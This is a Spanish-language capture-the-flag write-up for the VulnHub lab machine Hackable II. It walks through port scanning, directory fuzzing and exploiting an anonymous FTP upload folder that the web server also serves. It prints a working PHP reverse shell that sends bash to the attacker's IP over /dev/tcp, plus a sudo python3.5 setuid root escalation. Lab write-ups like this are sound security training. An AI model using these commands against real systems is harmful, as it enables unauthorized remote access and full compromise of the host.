---
title: Hackable II
date: 2024-07-03
categories: [WRITEUPS, VulnHub]
tags: []  # TAG names should always be lowercase
image: /assets/images/vulnhub/logo.png
---

En esta máquina, nos aprovecharemos del directorio de **Anonymous** en **FTP** para subir una **Reverse Shell**, y para la escalada de privilegios encontraremos la contraseña de **root** en un script.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaremos una vez conozcamos la dirección *IP*, será realizar un escaneo con **NMAP**, para comprobar los puertos que tiene abiertos.

```bash
nmap -p- --open -T5 192.168.1.151 -n -Pn -v
```

![picture](/assets/images/vulnhub/hackable1.png){: w="600" h="300" }

Una vez realizado el escaneo, realizaremos un escaneo exhaustivo de los puertos encontrados, para ver si podemos encontrar algo más mediante los scripts de NMAP.

```bash
nmap -p21,22,80 -sV -sC 192.168.1.151 -v 
```

![picture](/assets/images/vulnhub/hackable2.png){: w="600" h="300" }

Encontramos que el usuario **Anonymous** está habilitado, y su directorio contiene un archivo llamado "*CALL.html*".

A continuación, lo descargaremos y veremos que contiene.

![picture](/assets/images/vulnhub/hackable3.png)

En un principio no parece haber nada relevante.

![picture](/assets/images/vulnhub/hackable4.png){: w="600" h="300" }

En la web hay una página por defecto de **Apache2**, y buscando información filtrada o comentada en la fuente de la página, encontramos lo siguiente.

![picture](/assets/images/vulnhub/hackable5.png)

Lo siguiente será realizar **Fuzzing** con **Gobuster** para ver que encontramos.

```bash
gobuster dir -u http://192.168.1.151/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.html,.sh,.png,.jpg,.jpeg -b 404,403 
```

![picture](/assets/images/vulnhub/hackable6.png)

Encontramos la ruta "**/files/**", y comprobamos que es el mismo directorio que el que usa el usuario **Anonymous**.

![picture](/assets/images/vulnhub/hackable7.png){: w="600" h="300" }

---

## **Explotación**

Ya que el directorio que hemos encontrado, es el mismo que el de **Anonymous**, y lo podemos encontrar en el navegador, hay una vía potencial de subir un archivo **PHP** y que nos lo ejecute, así que subiremos una **Reverse Shell** simple, mediante **FTP**, para poder ejecutarla desde el navegador.

- *Reverse Shell*

    ```php
    <?php
    exec("/bin/bash -c 'bash -i > /dev/tcp/'Nuestra IP'/4444 0>&1'");
    ?>
    ```

![picture](/assets/images/vulnhub/hackable8.png)

Antes de ejecutarla, crearemos un **Listener** con **Ncat** en nuestra máquina local.

- Listener

    ```bash
    nc -nlvp 4444
    ```

Actualizamos la web una vez subamos el archivo, y clicamos en el archivo.

![picture](/assets/images/vulnhub/hackable9.png){: w="600" h="300" }

Y obtendremos acceso al servidor como el usuario "**www-data**".

---

## **Escalada de privilegios**

En el directorio *"/home/"* encontramos un archivo que nos indica que ejecutemos un *script*, y la carpeta personal de un usuario llamado **shrek**.

![picture](/assets/images/vulnhub/hackable10.png){: w="600" h="300" }

Si vemos el contenido del script, podemos comprobar que no hace nada, simplemente saca output por terminal, pero abajo podemos encontrar lo que parece una contraseña hasheada.

![picture](/assets/images/vulnhub/hackable11.png){: w="600" h="300" }

Nos vamos a [**Crackstation**](https://crackstation.net), e introducimos la contraseña, y nos la deshasea.

![picture](/assets/images/vulnhub/hackable12.png)

Intentamos acceder mediante **SSH**, y obtenemos acceso como el usuario "**shrek**". (También funciona con **su shrek**)

![picture](/assets/images/vulnhub/hackable13.png){: w="600" h="300" }

En su directorio personal, tenemos la primera **flag**.

![picture](/assets/images/vulnhub/hackable14.png){: w="600" h="300" }

Comprobando los permisos de **SUDO** del usuario "**shrek**", comprobamos que no necesita contraseña al ejecutar Python3.5 con permisos de **SUDO**.

Para escalar privilegios al usuario root, ejecutaremos lo siguiente.

```bash
sudo python3.5
```
Y dentro de **Python3.5**.

```python
import os
os.setuid(0)
os.system("whoami")
os.system("/bin/bash")
```

![picture](/assets/images/vulnhub/hackable15.png){: w="600" h="300" }

Y en el directorio personal de root, tenemos la segunda **flag**.

![picture](/assets/images/vulnhub/hackable16.png){: w="600" h="300" }